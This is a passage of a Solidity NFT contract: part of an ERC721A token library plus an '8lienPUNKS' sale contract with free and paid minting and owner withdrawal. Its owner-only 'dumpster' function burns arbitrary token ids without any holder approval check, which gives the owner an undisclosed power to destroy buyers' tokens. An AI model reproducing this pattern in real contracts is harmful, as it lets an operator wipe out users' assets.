1046         bytes memory _data
1047     ) public virtual override {
1048         _transfer(from, to, tokenId);
1049         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1050             revert TransferToNonERC721ReceiverImplementer();
1051         }
1052     }
1053 
1054     /**
1055      * @dev Returns whether `tokenId` exists.
1056      *
1057      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1058      *
1059      * Tokens start existing when they are minted (`_mint`),
1060      */
1061     function _exists(uint256 tokenId) internal view returns (bool) {
1062         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1063             !_ownerships[tokenId].burned;
1064     }
1065 
1066     function _safeMint(address to, uint256 quantity) internal {
1067         _safeMint(to, quantity, '');
1068     }
1069 
1070     /**
1071      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1072      *
1073      * Requirements:
1074      *
1075      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1076      * - `quantity` must be greater than 0.
1077      *
1078      * Emits a {Transfer} event.
1079      */
1080     function _safeMint(
1081         address to,
1082         uint256 quantity,
1083         bytes memory _data
1084     ) internal {
1085         _mint(to, quantity, _data, true);
1086     }
1087 
1088     /**
1089      * @dev Mints `quantity` tokens and transfers them to `to`.
1090      *
1091      * Requirements:
1092      *
1093      * - `to` cannot be the zero address.
1094      * - `quantity` must be greater than 0.
1095      *
1096      * Emits a {Transfer} event.
1097      */
1098     function _mint(
1099         address to,
1100         uint256 quantity,
1101         bytes memory _data,
1102         bool safe
1103     ) internal {
1104         uint256 startTokenId = _currentIndex;
1105         if (to == address(0)) revert MintToZeroAddress();
1106         if (quantity == 0) revert MintZeroQuantity();
1107 
1108         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1109 
1110         // Overflows are incredibly unrealistic.
1111         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1112         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1113         unchecked {
1114             _addressData[to].balance += uint64(quantity);
1115             _addressData[to].numberMinted += uint64(quantity);
1116 
1117             _ownerships[startTokenId].addr = to;
1118             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1119 
1120             uint256 updatedIndex = startTokenId;
1121             uint256 end = updatedIndex + quantity;
1122 
1123             if (safe && to.isContract()) {
1124                 do {
1125                     emit Transfer(address(0), to, updatedIndex);
1126                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1127                         revert TransferToNonERC721ReceiverImplementer();
1128                     }
1129                 } while (updatedIndex != end);
1130                 // Reentrancy protection
1131                 if (_currentIndex != startTokenId) revert();
1132             } else {
1133                 do {
1134                     emit Transfer(address(0), to, updatedIndex++);
1135                 } while (updatedIndex != end);
1136             }
1137             _currentIndex = updatedIndex;
1138         }
1139         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1140     }
1141 
1142     /**
1143      * @dev Transfers `tokenId` from `from` to `to`.
1144      *
1145      * Requirements:
1146      *
1147      * - `to` cannot be the zero address.
1148      * - `tokenId` token must be owned by `from`.
1149      *
1150      * Emits a {Transfer} event.
1151      */
1152     function _transfer(
1153         address from,
1154         address to,
1155         uint256 tokenId
1156     ) private {
1157         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1158 
1159         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1160             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1161             getApproved(tokenId) == _msgSender());
1162 
1163         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1164         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1165         if (to == address(0)) revert TransferToZeroAddress();
1166 
1167         _beforeTokenTransfers(from, to, tokenId, 1);
1168 
1169         // Clear approvals from the previous owner
1170         _approve(address(0), tokenId, prevOwnership.addr);
1171 
1172         // Underflow of the sender's balance is impossible because we check for
1173         // ownership above and the recipient's balance can't realistically overflow.
1174         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1175         unchecked {
1176             _addressData[from].balance -= 1;
1177             _addressData[to].balance += 1;
1178 
1179             _ownerships[tokenId].addr = to;
1180             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1181 
1182             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1183             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1184             uint256 nextTokenId = tokenId + 1;
1185             if (_ownerships[nextTokenId].addr == address(0)) {
1186                 // This will suffice for checking _exists(nextTokenId),
1187                 // as a burned slot cannot contain the zero address.
1188                 if (nextTokenId < _currentIndex) {
1189                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1190                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1191                 }
1192             }
1193         }
1194 
1195         emit Transfer(from, to, tokenId);
1196         _afterTokenTransfers(from, to, tokenId, 1);
1197     }
1198 
1199     /**
1200      * @dev Destroys `tokenId`.
1201      * The approval is cleared when the token is burned.
1202      *
1203      * Requirements:
1204      *
1205      * - `tokenId` must exist.
1206      *
1207      * Emits a {Transfer} event.
1208      */
1209     function _burn(uint256 tokenId) internal virtual {
1210         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1211 
1212         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1213 
1214         // Clear approvals from the previous owner
1215         _approve(address(0), tokenId, prevOwnership.addr);
1216 
1217         // Underflow of the sender's balance is impossible because we check for
1218         // ownership above and the recipient's balance can't realistically overflow.
1219         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1220         unchecked {
1221             _addressData[prevOwnership.addr].balance -= 1;
1222             _addressData[prevOwnership.addr].numberBurned += 1;
1223 
1224             // Keep track of who burned the token, and the timestamp of burning.
1225             _ownerships[tokenId].addr = prevOwnership.addr;
1226             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1227             _ownerships[tokenId].burned = true;
1228 
1229             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1230             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1231             uint256 nextTokenId = tokenId + 1;
1232             if (_ownerships[nextTokenId].addr == address(0)) {
1233                 // This will suffice for checking _exists(nextTokenId),
1234                 // as a burned slot cannot contain the zero address.
1235                 if (nextTokenId < _currentIndex) {
1236                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1237                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1238                 }
1239             }
1240         }
1241 
1242         emit Transfer(prevOwnership.addr, address(0), tokenId);
1243         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1244 
1245         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1246         unchecked {
1247             _burnCounter++;
1248         }
1249     }
1250 
1251     /**
1252      * @dev Approve `to` to operate on `tokenId`
1253      *
1254      * Emits a {Approval} event.
1255      */
1256     function _approve(
1257         address to,
1258         uint256 tokenId,
1259         address owner
1260     ) private {
1261         _tokenApprovals[tokenId] = to;
1262         emit Approval(owner, to, tokenId);
1263     }
1264 
1265     /**
1266      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1267      *
1268      * @param from address representing the previous owner of the given token ID
1269      * @param to target address that will receive the tokens
1270      * @param tokenId uint256 ID of the token to be transferred
1271      * @param _data bytes optional data to send along with the call
1272      * @return bool whether the call correctly returned the expected magic value
1273      */
1274     function _checkContractOnERC721Received(
1275         address from,
1276         address to,
1277         uint256 tokenId,
1278         bytes memory _data
1279     ) private returns (bool) {
1280         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1281             return retval == IERC721Receiver(to).onERC721Received.selector;
1282         } catch (bytes memory reason) {
1283             if (reason.length == 0) {
1284                 revert TransferToNonERC721ReceiverImplementer();
1285             } else {
1286                 assembly {
1287                     revert(add(32, reason), mload(reason))
1288                 }
1289             }
1290         }
1291     }
1292 
1293     /**
1294      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1295      * And also called before burning one token.
1296      *
1297      * startTokenId - the first token id to be transferred
1298      * quantity - the amount to be transferred
1299      *
1300      * Calling conditions:
1301      *
1302      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1303      * transferred to `to`.
1304      * - When `from` is zero, `tokenId` will be minted for `to`.
1305      * - When `to` is zero, `tokenId` will be burned by `from`.
1306      * - `from` and `to` are never both zero.
1307      */
1308     function _beforeTokenTransfers(
1309         address from,
1310         address to,
1311         uint256 startTokenId,
1312         uint256 quantity
1313     ) internal virtual {}
1314 
1315     /**
1316      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1317      * minting.
1318      * And also called after one token has been burned.
1319      *
1320      * startTokenId - the first token id to be transferred
1321      * quantity - the amount to be transferred
1322      *
1323      * Calling conditions:
1324      *
1325      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1326      * transferred to `to`.
1327      * - When `from` is zero, `tokenId` has been minted for `to`.
1328      * - When `to` is zero, `tokenId` has been burned by `from`.
1329      * - `from` and `to` are never both zero.
1330      */
1331     function _afterTokenTransfers(
1332         address from,
1333         address to,
1334         uint256 startTokenId,
1335         uint256 quantity
1336     ) internal virtual {}
1337 }
1338 
1339 
1340 
1341 contract $8lienPUNKS is ERC721A, Owneable {
1342 
1343     string public baseURI = "ipfs:///";
1344     string public contractURI = "ipfs://QmQPSjppcnhBUaqxsV7Cd6outGhMoDMUzEbkhyCPkGmteQ";
1345     string public baseExtension = ".json";
1346     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1347 
1348     uint256 public constant MAX_PER_TX_FREE = 5;
1349     uint256 public free_max_supply = 200;
1350     uint256 public constant MAX_PER_TX = 20;
1351     uint256 public max_supply = 1500;
1352     uint256 public price = 0.002 ether;
1353 
1354     bool public paused = true;
1355 
1356     constructor() ERC721A("8lienPUNKS", "8LIENS") {}
1357 
1358     function mint(uint256 _amount) external payable {
1359         address _caller = _msgSender();
1360         require(!paused, "Paused");
1361         require(max_supply >= totalSupply() + _amount, "Exceeds max supply");
1362         require(_amount > 0, "No 0 mints");
1363         require(tx.origin == _caller, "No contracts");
1364         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1365         
1366       if(free_max_supply >= totalSupply()){
1367             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1368         }else{
1369             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1370             require(_amount * price == msg.value, "Invalid funds provided");
1371         }
1372 
1373 
1374         _safeMint(_caller, _amount);
1375     }
1376 
1377   
1378 
1379     function isApprovedForAll(address owner, address operator)
1380         override
1381         public
1382         view
1383         returns (bool)
1384     {
1385         // Whitelist OpenSea proxy contract for easy trading.
1386         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1387         if (address(proxyRegistry.proxies(owner)) == operator) {
1388             return true;
1389         }
1390 
1391         return super.isApprovedForAll(owner, operator);
1392     }
1393 
1394     function probe() external onlyOwner {
1395         uint256 balance = address(this).balance;
1396         (bool success, ) = _msgSender().call{value: balance}("");
1397         require(success, "Failed to send");
1398     }
1399 
1400     function beamup(uint256 quantity) external onlyOwner {
1401         _safeMint(_msgSender(), quantity);
1402     }
1403 
1404 
1405     function pause(bool _state) external onlyOwner {
1406         paused = _state;
1407     }
1408 
1409     function setBaseURI(string memory baseURI_) external onlyOwner {
1410         baseURI = baseURI_;
1411     }
1412 
1413     function setContractURI(string memory _contractURI) external onlyOwner {
1414         contractURI = _contractURI;
1415     }
1416 
1417     function configPrice(uint256 newPrice) public onlyOwner {
1418         price = newPrice;
1419     }
1420 
1421     function configmax_supply(uint256 newSupply) public onlyOwner {
1422         max_supply = newSupply;
1423     }
1424 
1425     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1426         free_max_supply = newFreesupply;
1427     }
1428 
1429     function newbaseExtension(string memory newex) public onlyOwner {
1430         baseExtension = newex;
1431     }
1432 
1433 
1434 
1435         function dumpster(uint256[] memory tokenids) external onlyOwner {
1436         uint256 len = tokenids.length;
1437         for (uint256 i; i < len; i++) {
1438             uint256 tokenid = tokenids[i];
1439             _burn(tokenid);
1440         }
1441     }
1442 
1443 
1444     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1445         require(_exists(_tokenId), "Token does not exist.");
1446         return bytes(baseURI).length > 0 ? string(
1447             abi.encodePacked(
1448               baseURI,
1449               Strings.toString(_tokenId),
1450               baseExtension
1451             )
1452         ) : "";
1453     }
1454 }
1455 
1456 contract OwnableDelegateProxy { }
1457 contract ProxyRegistry {
1458     mapping(address => OwnableDelegateProxy) public proxies;
1459 }